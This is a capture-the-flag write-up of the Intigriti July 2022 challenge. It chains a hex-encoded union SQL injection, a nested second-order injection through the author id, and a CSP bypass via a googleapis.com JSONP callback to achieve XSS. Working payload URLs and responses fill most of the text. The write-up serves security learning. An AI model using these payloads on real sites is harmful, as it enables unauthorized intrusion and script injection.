# Intigriti July 2022 Challenge
###### writeup by [@h43z](https://twitter.com/h43z), [h.43z.one](https://h.43z.one)

```
For best learning effect always try to solve on your own first! 
If you hit a dead end, 
read writeup until you get new inspiration on how to proceed and stop reading further. 
Repeat until successful solve.
```

https://challenge-0722.intigriti.io/

Although advertised as an XSS challenge, on inspecting the website and clicking
through it, it becomes obvious quickly, there is not much javascript involved. 
No sources, No sinks, no code.

There is one place though where the website sends the server
an instruction, the Archive links.

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=3
```

The value `3` in the month GET parameter tells the server what article the client
wants to read. Typically blog content is stored in a database, so we should check
for SQL injection.

Such vulnerability could allow us to control the response from the server and
smuggle a XSS payload in. But more on that later.

It always makes sense to imagine one self in the role of the web developer and
how the backend and its queries look like. As attackers we constantly form
assumptions which explain the behavior we encounter. Those mental models might not
be 100% correct in reality but as long as they help us continue successfully
they are good enough for us.

We theorize the backend does something like

```
select * from posts where month = 3;
```
When we send the `?month=3`, the database then returns some data
```
It's March already | 2022-03-22 02:35:10 | Jake | Time goes fast
```
And judging from the file extension of challenge **.php**, PHP then after receiving 
the data from the database formats it and returns it to the client.

The easiest way to check for SQLi is by messing up the query syntax which leads
to an error.

And indeed if we provide month with the value **3'**

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=3'
```

we get an `error`.

Seems like the server blindly takes the GET parameter and puts it into the query.
One can see how it would lead to syntax error.

```
select * from posts where month = 3';
```

If the server uses MySQL the error it throws will look similar to this

```
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
``` 

Let's see if we can inject some logic into the query to make sure we have a 
SQLi here. First we provide a month that we are positive will not exist in the 
table entries.

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999
```

We would expect no error because it's valid syntax but an empty response.
And that's exactly what happens.

Let's build upon that query by adding `or true` which would result in following
query.

```
select * from posts where month = 9999 or true;
```

The `WHERE` statement becomes a conditional. Returning either columns where the
month equal 9999 (none, we already checked) or `TRUE` which applies to all entries
in that table.

If the mental model we have about the database is correct this should make the
server return all posts that it has.

Again, seems to be exactly what happens.

The future goal will be to use this SQLi to return a string that demonstrates XSS.
Like `<img/src/onerror=alert(1)>`.

In order to do that we will utilize the SQL `UNION` operator. But to make things
easier for for now our "payload" will simply be a number and not a string.

```
The UNION operator is used to combine the result-set of two or more SELECT statements.
```

Here an example of how it works.

```
select age,name,email from mytable where age = 30 union select 1337,1337,1337
30   | bob  | bob@gmail.com
1337 | 1337 | 1337
```

The key here is that every SELECT statement within UNION must have the same 
number of columns as the previous SELECT. 

Following would lead to an error

```
select age,name,email from mytable where age = 30 union select 1337
The used SELECT statements have a different number of columns
```

Up next we figure out how many columns the query we are attacking
returns. We do this by just adding a column until the website does **not** show 
an error.

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1
error

https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1,2
error

https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1,2,3
error

https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1,2,3,4
error

https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1,2,3,4,5
```
No error! This reveals that the select statement returns 5 columns. And looking
at the website we already see it rendering 3 columns. The integer `2` is in the place of
to the post title, `5` is the creation date, `3` the blog post content.
Oddly enough Integer `1` and `4` do not show up which in part is unsurprising because 
sometimes developers ask for more information from the database
than they will later use in rendering the content. Especially if you use `select *` 
which is a lazy habit among programmers.

Let's continue and change the integer 2 into a string, more precisely into a XSS
payload that shows we can execute javascript.

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1,'<img/src/onerror=alert(1)>',3,4,5
```

Eagerly we expect the post title to render into an image tag with on onerror handler
that pops and proofs we have found an XSS vulnerability.

But what's that, a `error`!

We know it's valid query syntax with the correct number of columns in the union select.
Some kind of additional checks or filtering must be going on that prohibits our payload.

We try a simpler string.
```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1,'hello',3,4,5
error
```
So the xss payload was not the problem. We minimize it further.

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1,'',3,4,5
error
```
The `''` seem to be the problem. In our mental model this still is valid syntax
which begs the question if the single `'` we initially used to quickly check
for SQLi was actually erroring because of bad syntax or some kind of filter.

Weirdly enough there is no error if the `'` is within a mysql comment

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1/*'*/,2,3,4,5
```

This tells us the filtering can't be a simple check for quotes in the get parameter.
Something else must be going on. But for now let's not get hung up on this. Let's work
around this little shock in our assumption. There sure have to be other ways
to create strings in mysql without quotes. OK google! "mysql string functions",
comes up with this.
```
CHAR() 	Return the character for each integer passed 
```

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1,char(65,65,65),3,4,5
AAA
```
Great this works. 65 is the decimal for ASCII character A. By reading the mysql
manual we also come across the version function. We quickly check the database
version, just for fun.

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1,version(),3,4,5
8.0.29
```
Some more reading and we find another, shorter way than using the char() function
for encoding our payload. Simply by using the hexadecimal (0x) representation.

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1,0x414141,3,4,5
AAA
```

We use this online tool https://www.convertstring.com/EncodeDecode/HexEncode to convert your
XSS payload `<img/src/onerror=alert(1)>` to hex `0x3C696D672F7372632F6F6E6572726F723D616C6572742831293E`


```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1,0x3C696D672F7372632F6F6E6572726F723D616C6572742831293E,3,4,5
```

And we see our payload! But wait, that's a problem. No popup. We see it which means
it did not get rendered into an actual image tag.

Checking the source of the website quickly tells us why.

```
<h2 class="blog-post-title">&lt;img/src/onerror=alert(1)&gt;</h2>
```

There is additional sanitation going on. The `<` and `>` got converted into `&lt;` and `&gt;`.
This is a problem for us. It will make any HTML tag injection impossible.

Maybe the sanitation is not in place in the other spots. We try to inject the payload
into all the places.


```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999%20union%20select%201,0x3C696D672F7372632F6F6E6572726F723D616C6572742831293E,0x3C696D672F7372632F6F6E6572726F723D616C6572742831293E,4,0x3C696D672F7372632F6F6E6572726F723D616C6572742831293E
```

Bummer! In the rendering process the input for title, date and post content all got properly sanitized.
But what about the author name? Maybe that value gets rendered differently. 
But where was the author in all our tests anyway, it never showed up. That's 
interesting and as we hit a dead end with the other fields worth investigating.

We know from looking at the regular response from an archive link we see on the site,

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=2
```
that every blog article not only has a title, creation date, post but also a 
author name, like Jake or Anton.

We saw from our request with the value ```9999 union select 1,2,3,4,5``` that 
column `2` represents the title, `5` creation date and `3` the post content. 
This leaves column `1` or `4` for the author. But why is the integer `1` or `4`
not shown in the spot where we would expect the author name to appear?

Maybe the code does not expect a number to be the author name and somehow fails.
But we tried sending an hex encoded string and that didn't work either.

Could it be that the author name is actually stored a different table? 
This would not be an unusual DB layout. Have one table eg. `authors` with columns
like `id`, `firstname`, `lastname`. And then one table `posts` in which you just store a pointer author `id` to an entry in the `authors` table.  This would mean that the first query returns some data plus author `id` and then uses that id to retrieve, with a second query the firstname like `Anton` from `authors`.  And if the `id` is one that is not present in the `authors` table it returns no entries. This could explain why there is nothing rendered. Are we providing the wrong id? And if there is a second query, is that also prone to SQLi?  We don't know what the correct author ids are and they don't even really matter but let's just quickly check if they are easily guessable. We know two authors exist.  `Jake` and `Anton`. Id `0` and `1` or `1` and `2` would make sense? We already know what the columns `2`,`4`,`5` stand for, let's put the integer `0` into column
`1` and `4` and test our theory about the second query.

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 0,1337,1337,0,1337
```
Nope, still nothing. Let's repeat with `1`.

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1,1337,1337,1,1337
```
Hello `Anton`! Looks like there is indeed a second query happening.
Last thing, to check which column is the author id.

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 1,1337,1337,1337,1337
```
It's column `4`. If `Anton` has id `1` maybe `Jake` has id `2`

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 0,0,0,2,0
```
Correct. As id `2` is used for a second query it will probably again be susceptible 
to SQL injection. Let's try first with some logic injection again.

`999 or true` returns alls rows and will probably then show the first name.

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 0,0,0,999 or true,0
```

Right,`Anton` shows up. Now `999 or false` will show nothing.

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 0,0,0,999 or false,0
```
Oh?! What's that. Again `Anton`. Something is wrong here. We realize that we 
will have to be careful. We don't want the `999 or false` be evaluated in
the first injection but in the second. Best to pass it as a simple string into
the second. As we can't use `"` or `'` we will fallback on the hex encoding.

`999 or false` in hex is `0x393939206F722066616C7365`.

```
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999 union select 0,0,0,0x393939206F722066616C7365,0
```
Empty, nice. Now it really works. We now have to do the same thing like before.
Figure out how many columns the second query returns to construct a valid
`union select`. But this time every time hex encoded.

```
0 union select 1      => 0x3020756E696F6E2073656C6563742031 
0 union select 1,2    => 0x3020756E696F6E2073656C65637420312C32
0 union select 1,2,3  => 0x3020756E696F6E2073656C65637420312C322C33

https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999%20union%20select%200,0,0,0x3020756E696F6E2073656C65637420312C322C33,0
```
And bingo. After checking `3` times we see the integer `2` appear in the 
place of the author name. We know learned the second SQL query returns `3` columns and
the author is expected in the `2` place.

Let's place a string in the `2` column and see if we can inject an author.
```
0 union select 1,"h43z",3 => 0x3020756E696F6E2073656C65637420312C226834337A222C33
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999%20union%20select%200,0,0,0x3020756E696F6E2073656C65637420312C226834337A222C33,0
```
Empty!? Where has our injected author `h43z` gone? We remember, we have to be 
careful. This is like Incecption, the movie. We are preparing our sql injection already
within an injection. The encoding get's peeled away after the first query and
then we again have an `"` in there which we know does the application not like.

To fix this we will have to encode the string first. Place it then in the second
injection, encode that whole thing again.

```
h43z   => 0x6834337A
0 union select 1,0x6834337A,3 => 0x3020756E696F6E2073656C65637420312C307836383334333337412C33
https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999%20union%20select%200,0,0,0x3020756E696F6E2073656C65637420312C307836383334333337412C33,0
```

Awesome! We injected an custom author string. Let's replace it with an actual
xss payload.

```
<img/src/onerror=alert(1>   
=> 0x3C696D672F7372632F6F6E6572726F723D616C65727428313E

0 union select 1,0x3C696D672F7372632F6F6E6572726F723D616C65727428313E,3 
=> 0x3020756E696F6E2073656C65637420312C307833433639364436373246373337323633324636463645363537323732364637323344363136433635373237343238333133452C33

https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999%20union%20select%200,0,0,0x3020756E696F6E2073656C65637420312C307833433639364436373246373337323633324636463645363537323732364637323344363136433635373237343238333133452C33,0

```
Still no popup?!! We check the source code. And see this.
```
<p class="blog-post-meta">0 by 
  <a href="#">
    <img src="" onerror="alert(1">
  </a>
</p>
```
The rendering into an actual image tag worked. So what's going on. Let's open
the dev tools.

```
Refused to execute inline event handler because it violates the following Content Security Policy directive: "default-src 'self' *.googleapis.com *.gstatic.com *.cloudflare.com". Either the 'unsafe-inline' keyword, a hash ('sha256-...'), or a nonce ('nonce-...') is required to enable inline execution. Note that hashes do not apply to event handlers, style attributes and javascript: navigations unless the 'unsafe-hashes' keyword is present. Note also that 'script-src' was not explicitly set, so 'default-src' is used as a fallback.
```
No we understand why no onerror handler was triggered. The website has a CSP that
prohibits any inline execution.

If we look for the actual http header in the response of the server we see the
full policy.

```
content-security-policy
	default-src 'self' *.googleapis.com *.gstatic.com *.cloudflare.com
```

Only `<scripts>` with a src from the domain self meaning `challenge-0722.intigriti.io`, 
`*.googleapis.com`, `*.gstatic.com` or `*.cloudflare.com` are allowed to execute.

So after all the work we already put in we will still have to find a CSP bypass
to proof XSS.

Let's check if google has any tips for us how to do that.
We use `https://csp-evaluator.withgoogle.com/` to check the CSP for insecure settings.
```
*.googleapis.com
    ajax.googleapis.com is known to host JSONP endpoints and Angular libraries which allow to bypass this CSP.
    ajax.googleapis.com is known to host Flash files which allow to bypass this CSP.


*.gstatic.com
    www.gstatic.com is known to host Angular libraries which allow to bypass this CSP.


*.cloudflare.com
    cdnjs.cloudflare.com is known to host Angular libraries which allow to bypass this CSP.
```

All 3 domains are actually CDNs, they host javascript libraries.
Unfortunately these are not public CDNs where we could upload our own javascript code.
You will only find big, popular, well maintained js libraries. But as the 
validator already points out those websites often host old versions of libraries 
like Angular which may have some vulnerabilities on it's own in it.

This website proofed to be a good resource
```
https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass
```

After some trial and error we concluded that many vulnerabilities in existing 
libraries had their own short comings and we couldn't get them to work.

Fortunately googleapis.com used to have a lot of JSONP endpoints and some are still
active. A JSONP endpoint from a whitelisted domain means CSP bypass. But we have
to find one. After going through some google results for `googleapis jsonp`, `googleapis.com csp` and
encountering many that don't work anymore, we do the same searches on github.
Then repeat again on twitter until we finally hit the jackpot.

Someone already found and tweeted about this public endpoint where you can
provide a custom callback name.
```
www.googleapis.com/customsearch/v1?callback=alert(1)

// API callback
alert(1)({
  "error": {
    "code": 403,
    "message": "SSL is required to perform this operation.",
    "errors": [
      {
        "message": "SSL is required to perform this operation.",
        "domain": "global",
        "reason": "sslRequired"
      }
    ],
    "status": "PERMISSION_DENIED"
  }
}
);

```

If we inject this script tag

```
<script src="www.googleapis.com/customsearch/v1?callback=alert(document.domain)"></script>
```

we no longer violate the CSP and can finally trigger javascript to proof XSS.
Last steps!

```
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(document.domain)"></script>
=> 0x3C736372697074207372633D2268747470733A2F2F7777772E676F6F676C65617069732E636F6D2F637573746F6D7365617263682F76313F63616C6C6261636B3D616C65727428646F63756D656E742E646F6D61696E29223E3C2F7363726970743E0A

0 union select 1,0x3C736372697074207372633D2268747470733A2F2F7777772E676F6F676C65617069732E636F6D2F637573746F6D7365617263682F76313F63616C6C6261636B3D616C65727428646F63756D656E742E646F6D61696E29223E3C2F7363726970743E0A,3
=> 0x3020756E696F6E2073656C65637420312C30783343373336333732363937303734323037333732363333443232363837343734373037333341324632463737373737373245363736463646363736433635363137303639373332453633364636443246363337353733373436463644373336353631373236333638324637363331334636333631364336433632363136333642334436313643363537323734323836343646363337353644363536453734324536343646364436313639364532393232334533433246373336333732363937303734334530412C33

https://challenge-0722.intigriti.io/challenge/challenge.php?month=9999%20union%20select%200,0,0,0x3020756E696F6E2073656C65637420312C30783343373336333732363937303734323037333732363333443232363837343734373037333341324632463737373737373245363736463646363736433635363137303639373332453633364636443246363337353733373436463644373336353631373236333638324637363331334636333631364336433632363136333642334436313643363537323734323836343646363337353644363536453734324536343646364436313639364532393232334533433246373336333732363937303734334530412C33,0
```

And that's how we solved the 2022 Intigrity July Challenge.

Follow me on [twitter.com/h43z](https://twitter.com) for more fun, exploration! Or mention @h43z to ask questions.
